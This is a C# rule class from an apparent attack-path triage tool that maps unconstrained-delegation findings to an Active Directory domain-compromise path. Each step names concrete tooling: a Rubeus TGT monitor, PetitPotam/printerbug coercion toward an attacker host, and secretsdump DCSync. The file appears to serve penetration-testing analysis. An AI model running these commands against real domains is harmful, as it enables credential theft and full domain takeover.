using ZeroDayTriage.Core.Abstractions;
using ZeroDayTriage.Core.Model;

namespace ZeroDayTriage.Reasoning.Rules;

/// <summary>
/// Phase 3 depth — a host trusted for unconstrained delegation will cache the TGT of any
/// principal that authenticates to it. Coerce a Domain Controller to authenticate, capture its
/// TGT, and you own the domain.
/// </summary>
public sealed class UnconstrainedDelegationRule : IAttackPathRule
{
    public string Id => "AD-UNCONSTRAINED";

    public string Description => "Unconstrained delegation host -> coerce DC -> capture TGT -> DCSync.";

    public AssetDomain Domain => AssetDomain.ActiveDirectory;

    public IEnumerable<AttackPath> Evaluate(FindingCorpus findings)
    {
        foreach (var f in findings.WithTag("unconstrained-delegation"))
        {
            var host = f.Principal ?? "the delegation host";

            yield return new AttackPath
            {
                Name = $"Unconstrained delegation on {host}",
                Objective = "Domain compromise via captured DC TGT",
                Domain = AssetDomain.ActiveDirectory,
                Phase = MissionPhase.PrivilegeEscalation,
                Impact = Severity.Critical,
                Confidence = f.Confidence,
                Rationale =
                    $"{host} is trusted for unconstrained delegation -> coerce a DC to authenticate to it, " +
                    "capture the DC's TGT from memory, then DCSync.",
                Steps = new[]
                {
                    new AttackStep
                    {
                        Action = $"Run a TGT capture listener on {host} (which you must control).",
                        Tooling = "Rubeus monitor /interval:1 /nowrap",
                        Phase = KillChainPhase.Exploit,
                        Technique = "T1187",
                        EvidenceFindingIds = new[] { f.Id },
                    },
                    new AttackStep
                    {
                        Action = "Coerce a domain controller to authenticate to the delegation host.",
                        Tooling = "PetitPotam.py / printerbug.py <attacker-host> <DC>",
                        Phase = KillChainPhase.Exploit,
                        Technique = "T1187",
                        EvidenceFindingIds = new[] { f.Id },
                    },
                    new AttackStep
                    {
                        Action = "Use the captured DC TGT to DCSync the domain.",
                        Tooling = "secretsdump.py -k -just-dc <DOMAIN>/<DC$>@<DC>",
                        Phase = KillChainPhase.LootAndPivot,
                        Technique = "T1003.006",
                        EvidenceFindingIds = new[] { f.Id },
                    },
                },
            };
        }
    }
}
